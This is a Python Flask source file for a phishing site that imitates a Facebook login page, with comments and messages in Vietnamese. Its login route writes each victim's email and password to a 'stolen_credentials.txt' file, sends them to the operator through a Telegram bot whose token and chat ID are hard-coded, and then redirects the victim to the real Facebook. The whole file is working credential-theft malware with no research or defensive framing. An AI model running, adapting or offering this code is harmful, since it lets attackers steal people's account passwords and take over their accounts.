from flask import Flask, render_template, request, redirect, make_response
import os
import requests
from datetime import datetime

app = Flask(__name__)

# ================== TELEGRAM CONFIG ==================
TELEGRAM_TOKEN = "8600949928:AAERwWL0-6sODzfixw--L5rNHW4hRW56HnY"
TELEGRAM_CHAT_ID = "6126534090"

def send_to_telegram(email, password):
    message = f"""
🔴 **THÔNG TIN MỚI ĐÃ THU THẬP**

📧 Email: {email}
🔑 Password: {password}
⏰ Time: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
🌐 Source: Facebook Fake
    """
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"})
        print(f"✅ Đã gửi Telegram: {email}")
    except Exception as e:
        print(f"❌ Lỗi gửi Telegram: {e}")

# ====================================================

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form.get('email')
    password = request.form.get('pass')
    
    with open('stolen_credentials.txt', 'a', encoding='utf-8') as f:
        f.write(f"[{datetime.now()}] Email: {email} | Password: {password}\n")
    
    send_to_telegram(email, password)
    
    resp = make_response(redirect('https://www.facebook.com'))
    resp.set_cookie('session_id', 'hijackable_' + os.urandom(8).hex(), httponly=True)
    return resp

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)